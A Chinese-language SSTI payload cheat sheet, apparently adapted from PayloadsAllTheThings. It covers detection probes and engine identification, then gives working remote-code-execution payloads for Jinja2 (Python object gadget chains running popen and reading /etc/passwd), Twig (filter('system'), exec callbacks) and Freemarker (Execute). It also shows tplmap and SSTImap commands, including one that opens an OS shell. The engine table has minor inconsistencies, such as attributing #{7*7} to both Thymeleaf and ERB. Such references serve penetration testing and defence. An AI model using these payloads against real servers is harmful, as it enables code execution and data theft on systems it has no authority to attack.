# SSTI - 服务端模板注入

[SEARCH_KEYWORDS]
漏洞类型: SSTI Server-Side Template Injection 服务端模板注入
攻击类型: RCE Remote Code Execution Arbitrary Code Execution
关键词: template {{ }} <% %> ${ } #{} template engine Jinja2 Twig
模板引擎: Jinja2 Twig FreeMarker Velocity Thymeleaf ERB Smarty Mako
技术: Template Syntax Detection Gadget Chain Code Execution

[CONTENT]

## SSTI概述

模板注入允许攻击者将模板代码包含到现有模板中。模板引擎通过在运行时将变量/占位符替换为实际值，使HTML页面设计更容易。

## 检测方法

### 识别漏洞输入点

常见位置：表单、搜索栏、模板预览功能、PDF生成、发票、邮件。

### 注入模板语法

常见模板表达式：

```powershell
{{7*7}}     # Jinja2, Twig (返回49)
#{7*7}      # Thymeleaf (返回49)
${7*7}      # Freemarker, Velocity
<%= 7*7 %>  # ERB, EJS
```

### Polyglot Payload

检测SSTI的多语言Payload：

```powershell
${{<%[%'"}}%\.
```

## 模板引擎识别

根据返回结果判断模板引擎：

| Payload | 结果 | 引擎 |
|---------|------|------|
| `{{7*7}}` | 49 | Jinja2, Twig |
| `{{7*'7'}}` | 7777777 | Jinja2 |
| `{{7*'7'}}` | 49 | Twig |
| `${7*7}` | 49 | Freemarker |
| `#{7*7}` | 49 | Ruby ERB |

## 主要模板引擎

### Python

- Jinja2 (Flask)
- Django Template
- Mako
- Tornado

### Java

- Freemarker
- Velocity
- Thymeleaf
- Jinjava

### PHP

- Twig
- Smarty
- Blade

### Ruby

- ERB
- Slim
- Haml

## Jinja2 (Python) Payload

### 基础RCE

```python
# 直接执行
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# 利用config
{{ config.items() }}

# 利用request
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### 命令执行

```python
# 方法1
{{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('id').read() }}

# 方法2 - 使用lipsum
{{ lipsum.__globals__['os'].popen('id').read() }}

# 方法3 - 使用cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

## Twig (PHP) Payload

```php
{{_self.env.display("id")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

## Freemarker (Java) Payload

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
```

## 工具

- TInjA - SSTI/CSTI扫描器
- tplmap - SSTI检测利用工具
- SSTImap - 自动SSTI检测工具

```powershell
# tplmap使用
python2.7 ./tplmap.py -u 'http://target/page?name=John*' --os-shell

# SSTImap使用
python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
```

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Template Injection/README.md